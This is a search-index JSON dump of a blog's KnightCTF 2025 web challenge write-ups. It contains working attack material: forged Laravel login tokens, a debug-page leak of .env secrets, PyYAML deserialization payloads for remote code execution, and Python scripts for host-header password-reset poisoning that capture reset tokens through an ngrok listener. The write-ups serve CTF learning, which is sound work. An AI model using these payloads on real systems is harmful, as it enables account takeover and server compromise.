        "content": "Exploitation Steps Initial setup Initially, to generate the URL, I used https://onlinephp.io/. I also found this website useful for generating \u201cpasswords\u201d with Laravel\u2019s bcrypt (https://fbutube.com/laravel-password-generator). However, in the end, I decided to write it in PHP and run it locally, as this way I could fully automate the process. Exploitation After obtaining the admin\u2019s email nomanprodhan@knightconnect.com, it was quite simple to forge a token, since it was made up of \u201cemail|timestamp\u201d. I then wrote a PHP script that did exactly what the first function did, using bcrypt on the string formed by the admin\u2019s email + timestamp, and then generating a link similar to the one in the function with the parameters token, time, and email. This way, I created a valid login link, since the user associated with the email actually existed. I gained access to their account, and by visiting the homepage as seen earlier, with the is_admin flag on the account, I was able to retrieve the flag. Flag capture Manual Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:6:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udee0\ufe0f Exploitation Process ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:7:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Approach I wrote the exploit in PHP because I had issues with token composition using bcrypt in Python. This exploit takes the admin\u2019s email, which has the flag in their profile, and then creates a valid token with a timestamp less than one hour old. It then generates a URL with a valid token to access the admin profile, and through a cURL function in PHP, it makes a request to the page, extracting the flag via a regex. I used the following commands for the requirements and the run: sudo apt install php sudo apt-get install php-curl php exploit.php \u00a0Exploit ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:7:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udea9 Flag Capture Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:8:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:8:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udd27 Tools Used ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:9:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Primary Tools Tool Purpose PHP Exploit ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:9:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udca1 Key Learnings ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:10:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:10:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcda References & Resources ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:11:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Learning Resources https://laravel.com/docs/11.x/hashing ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:11:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking 10/451 Challenge ranking Points Earned 260 Team contribution Created: 20-01-2025 \u2022 Last Modified: 20-01-2025 Author: mH4ck3r0n3 \u2022 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:12:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Exceeding Knight' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/",
        "tags": [
          "Improper Error Handling",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Challenge Description Challenge Presentation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:1",
        "tags": [
          "Improper Error Handling",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial Analysis The site appeared as follows: Site Presentation There was nothing interesting here, so I began reading the attached files. The first thing I did was read the web.php file located in the routes folder. I found the following routes: Route::get('/calculator', [CalculatorController::class, 'index']); Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission Route::get('/convert', [UnitConversionController::class, 'index']); Route::post('/convert', [UnitConversionController::class, 'convert']); Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']); Route::post('/character-count', [StringManipulationController::class, 'characterCount']); Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']); Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']); Route::post('/profile', [ProfileController::class, 'index']); Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route Route::get('/', function () { return view('welcome'); Next, I read the .env file and found something interesting: APP_NAME=Laravel APP_ENV=local APP_KEY=base64:KnrD53eO60BJBvCVGNlBuOqktUCAsTuod34OelLJjPQ= APP_DEBUG=true APP_URL=http://localhost MAX_CALC_LIMIT=100000000000000000 LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=root DB_PASSWORD= BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=file SESSION_LIFETIME=120 FLAG=KCTF{i_am_not_flag} Aside from the APP_KEY and FLAG, as we can see, Laravel\u2019s debug mode is enabled. When debug mode is enabled in Laravel, any error that occurs will trigger a detailed error page. This page includes: Error Message: A clear description of the error. Stack Trace: A full trace of the error, showing the file paths and lines of code where the issue occurred. Environment Details: Information about the environment, including variables, configurations, and request headers. Sensitive Data Exposure: Potential exposure of .env values, database credentials, API keys, and other sensitive information. So, I thought about exploiting the enabled debug mode in Laravel to capture the flag. The only thing I needed was a way to trigger any kind of error. I found this method in the /calculator route, to be more precise, in the CalculatorController.php file under the Http/Controllers folder. As we can see, by entering a number greater than MAX_CALC_LIMIT=100000000000000000 an exception is thrown: <?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; class CalculatorController extends Controller { public function index() { return view('calculator'); } public function calculate(Request $request) { $request->validate([ 'num1' => 'required|numeric', 'num2' => 'required|numeric', 'operation' => 'required|in:add,sub,mul,div', ]); $num1 = $request->input('num1'); $num2 = $request->input('num2'); $operation = $request->input('operation'); $limit = env('MAX_CALC_LIMIT', 100000); if ($num1 > $limit || $num2 > $limit) { throw new \\Exception(\"You have hit the calculation limit set in the .env file.\"); } $result = match ($operation) { 'add' => $num1 + $num2, 'sub' => $num1 - $num2, 'mul' => $num1 * $num2, 'div' => $num2 != 0 ? $num1 / $num2 : throw new \\Exception(\"Division by zero is not allowed.\"), }; return view('calculator', ['result' => $result]); } } ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:2",
        "tags": [
          "Improper Error Handling",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploit So, all I had to do was enter 1000000000000000000 (just adding a simple zero) in the num1 parameter to trigger the exception. This caused the detailed error page to return, which contained the flag inside it: Manual Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:3",
        "tags": [
          "Improper Error Handling",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:4",
        "tags": [
          "Improper Error Handling",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Baby Injection' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/",
        "tags": [
          "YAML Insecure Deserialization",
          "Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Challenge Description Challenge Presentation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:1",
        "tags": [
          "YAML Insecure Deserialization",
          "Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial Analysis The site appears as follows: Site Presentation The first thing that immediately stands out is the site\u2019s URL: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE= In fact, that looks like a base64 encoding. Let\u2019s try to decode it: echo \"eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=\" | base64 -d Decoding it, I got the following: yaml: Its yaml bro, hack me if you can!!! So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:2",
        "tags": [
          "YAML Insecure Deserialization",
          "Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploit I personally used this payload: yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"] But many other payloads could have been used, such as: yaml: !!python/object/apply:subprocess.getoutput [\"ls -al\"] Other payloads can be found on PayloadsAllTheThings. So, I simply encoded it in base64: echo \"yaml: python/object/apply:subprocess.getoutput ['ls -al']\" | base64 And that\u2019s how I formed the URL for injecting the \u201cls -al\u201d command: http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag: Manual Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:3",
        "tags": [
          "YAML Insecure Deserialization",
          "Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Automated Exploit I also created an automated Python exploit for extracting the flag: import requests import base64 import re url = \"http://172.105.121.246:5990/\" payload = '''yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"]''' print(\"\\nFLAG: \" + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0)) ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:4",
        "tags": [
          "YAML Insecure Deserialization",
          "Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:5",
        "tags": [
          "YAML Insecure Deserialization",
          "Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": " Hi, I'm Matteo Maccarone, a passionate computer science enthusiast with a particular interest in cybersecurity. I've always aimed to combine my curiosity with a passion for cybersecurity, approaching every new project with enthusiasm and dedication. ",
        "date": "03/02/2025",
        "objectID": "/about/:0:0",
        "tags": [
          "\ud83d\udcbb\u200b About Me"
        ],
        "title": "About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "Who Am I I consider myself a very curious person with a strong passion for knowledge. Over the years, I\u2019ve developed skills in programming and cybersecurity. Outside of my work, I enjoy traveling and playing CTF (Capture The Flag), which helps me maintain a balance between creativity and productivity. ",
        "date": "03/02/2025",
        "objectID": "/about/:1:0",
        "tags": [
          "\ud83d\udcbb\u200b About Me"
        ],
        "title": "About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "What I Do I\u2019m currently a university student, and I occasionally try my hand at bug bounty work. In my work, I focus on finding new ways to protect web applications. Every project offers me the opportunity to improve, learn something new, and contribute to the progress of cybersecurity in a meaningful way. In my free time, I also enjoy reading and watching movies or TV series. ",
        "date": "03/02/2025",
        "objectID": "/about/:2:0",
        "tags": [
          "\ud83d\udcbb\u200b About Me"
        ],
        "title": "About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "My Vision I firmly believe that this world is still full of things to discover. My mission is to become an established penetration tester, contributing positively to the field of cybersecurity. ",
        "date": "03/02/2025",
        "objectID": "/about/:3:0",
        "tags": [
          "\ud83d\udcbb\u200b About Me"
        ],
        "title": "About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "Contact Me If you want to get in touch or talk about anything, feel free to reach out! You can find the links to my profiles on the homepage. I\u2019d love to hear your thoughts or discuss new opportunities! Thanks for visiting my space! ~ mH4ck3r0n3 ",
        "date": "03/02/2025",
        "objectID": "/about/:4:0",
        "tags": [
          "\ud83d\udcbb\u200b About Me"
        ],
        "title": "About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Admin Access' from KnightCTF - 2025",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/",
        "tags": [
          "Host Header Injection",
          "Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial Analysis The site appeared as follows, with a login screen: Site Presentation After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That\u2019s when I realized that registering was pointless. Inspecting the page source, I found a strange comment: Admin Email the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the \u201cForgot Password\u201d section: Forgot Password Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection. ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:1",
        "tags": [
          "Host Header Injection",
          "Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploit So i started ngrok on port 80: And then, using Burp Suite, I modified the Host header to Host: ngrok_link. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent \u201cForgot Password\u201d request with the email kctf2025@knightctf.com: Intercept After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials: username: kctf2025 password: new_password Manual Flag ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:2",
        "tags": [
          "Host Header Injection",
          "Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Automated Exploit I also created a fully automated exploit that performs the entire process described earlier: ngrok http 8080 # (set the ngrok url in the request.py file) python exploit.py python request.py this is exploit.py: import http.server import socketserver import requests import re from urllib.parse import urlparse, parse_qs class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Extract the token parameter from the request token = parse_qs(urlparse(self.path).query).get('token', [None])[0] self.send_request(token) def send_request(self, token): s = requests.Session() url = \"http://45.56.68.122:7474/\" password = \"supermario45\" data ={ \"token\":token, \"new_password\":password } # Request for the password reset of the admin account s.post(url+\"reset-password\", data=data).text credentials={ \"username\":\"kctf2025\", \"password\":password } # Request login admin account with Flag extraction via Regex print(\"\\nFLAG: \" + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0)) def start_server(): PORT = 8080 with socketserver.TCPServer((\"\", PORT), MyHandler) as httpd: httpd.serve_forever() if __name__ == \"__main__\": start_server() and this is request.py: import requests requests.post(\"http://45.56.68.122:7474/forgot-password\", data={\"email\":\"kctf2025@knightctf.com\"}, headers={\"Host\":\"6cde-93-70-84-224.ngrok-free.app\"}) ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:3",
        "tags": [
          "Host Header Injection",
          "Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag Flag ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:4",
        "tags": [
          "Host Header Injection",
          "Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    }
  ]
}